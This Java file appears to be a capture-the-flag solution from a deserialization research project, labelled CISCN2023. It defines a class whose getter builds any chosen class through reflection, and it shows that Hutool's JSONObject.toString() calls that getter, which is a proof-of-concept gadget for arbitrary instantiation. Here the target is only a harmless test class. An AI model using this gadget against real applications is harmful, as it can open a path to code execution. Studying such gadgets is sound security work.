package dev.silente.javashark.solution;

import cn.hutool.json.JSONObject;
import dev.silente.javashark.utils.TestUtils;

import java.lang.reflect.Constructor;

public class CISCN2023 {
    public static void main(String[] args) {
        Myexpect myexpect = new Myexpect();
        myexpect.setTargetclass(TestUtils.class);
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("foo", myexpect);
        System.out.println("--------");

        jsonObject.toString();
    }
}



class Myexpect extends Exception {
    private Class[] typeparam;

    private Object[] typearg;

    private Class targetclass;

    public String name;

    public String anyexcept;

    public Class getTargetclass() {
        return this.targetclass;
    }

    public void setTargetclass(Class targetclass) {
        this.targetclass = targetclass;
    }

    public Object[] getTypearg() {
        return this.typearg;
    }

    public void setTypearg(Object[] typearg) {
        this.typearg = typearg;
    }

    public Object getAnyexcept() throws Exception {
        System.out.println("getAnyexcept");
        Constructor con = this.targetclass.getConstructor(this.typeparam);
        return con.newInstance(this.typearg);
    }

    public void setAnyexcept(String anyexcept) {
        this.anyexcept = anyexcept;
    }

    public Class[] getTypeparam() {
        return this.typeparam;
    }

    public void setTypeparam(Class[] typeparam) {
        this.typeparam = typeparam;
    }

    public String getName() {
        return this.name;
    }

    public void setName(String name) {
        this.name = name;
    }
}